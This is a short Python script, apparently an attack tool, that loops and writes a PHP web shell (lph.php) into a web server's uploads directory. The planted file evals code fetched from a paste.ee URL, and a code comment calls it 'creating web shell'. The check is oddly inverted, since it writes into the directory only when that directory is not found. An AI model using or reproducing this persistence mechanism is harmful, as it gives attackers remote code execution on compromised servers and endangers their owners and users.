import os
import time
import os.path

def main():
    while True:
        f = os.path.exists('/var/www/html/uploads/')
        
        if f == True:
            print("[*] file exists")
            pass
            time.sleep(1)
            
        else:
            print("[!] file not found")
            print("[!] creating file")
            # creating web shell 
            a = open('/var/www/html/uploads/lph.php','a')
            a.write('<?php eval("?>".file_get_contents("https://paste.ee/r/XB3kD"));?>') 
            a.close()

            time.sleep(1)
main()
